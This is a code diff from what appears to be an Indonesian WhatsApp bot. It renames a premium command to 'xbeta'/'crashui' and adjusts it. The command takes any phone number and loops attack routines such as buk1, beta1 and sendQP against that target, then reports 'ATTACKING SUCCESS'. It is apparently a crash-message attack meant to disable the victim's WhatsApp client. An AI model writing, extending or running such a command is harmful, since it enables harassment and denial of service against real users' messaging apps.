@@ -2128,18 +2128,18 @@ reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Vi
 }
 break
 
-case 'stuk': case 'flow': 
+case 'xbeta': case 'crashui': 
 if (!isPremium) return reply(mess.only.premium)
 if (!q) return reply(`Example: ${prefix + command} 62×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(bugres)
 for (let i = 0; i < 3; i++) {
-await buk1(viper, target, "Punten", 1020000, ptcp = true);
+await buk1(viper, target, "Punten", 1020, ptcp = true);
 sendQP(target, wanted)
 await sendQP(target, wanted)
-await beta2(viper, target, wanted)
+await beta2(viper, target)
 await sendSessionStructure(target, wanted)
-await beta1(viper, target, wanted)
+await beta1(viper, target)
 darkphonk = fs.readFileSync('./database/suki.mp3')
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
